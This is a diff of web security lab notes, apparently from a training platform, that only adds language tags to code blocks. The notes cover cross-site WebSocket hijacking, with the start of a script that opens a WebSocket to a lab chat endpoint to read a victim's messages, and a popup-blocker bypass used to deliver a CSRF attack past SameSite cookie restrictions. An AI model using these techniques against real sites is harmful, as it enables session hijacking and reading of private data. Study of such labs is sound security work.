@@ -30,7 +30,7 @@ in http history find a response that mentions switching protocol in that corresp
 with no restrictions we can add the following script on our website 
 once the victim has visited the page we see that we can see the chat message from our victim now but because of the same site equals strict session cookie restriction we're only seeing chat messages or the chat message for a new chat session.
 
-```
+```js
 <script>
 var webSocket = new WebSocket("lab-url/chat");
 
@@ -73,12 +73,12 @@ It's somewhat impractical to try timing the attack to fall within this short win
  To trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current OAuth session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack.
 
 Alternatively, you can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction. For example, the following popup will be blocked by the browser by default:
-```
+```js
 window.open('https://vulnerable-website.com/login/sso');
 ```
 
 To get around this, you can wrap the statement in an onclick event handler as follows:
-```
+```js
 window.onclick = () => {
     window.open('https://vulnerable-website.com/login/sso');
 }
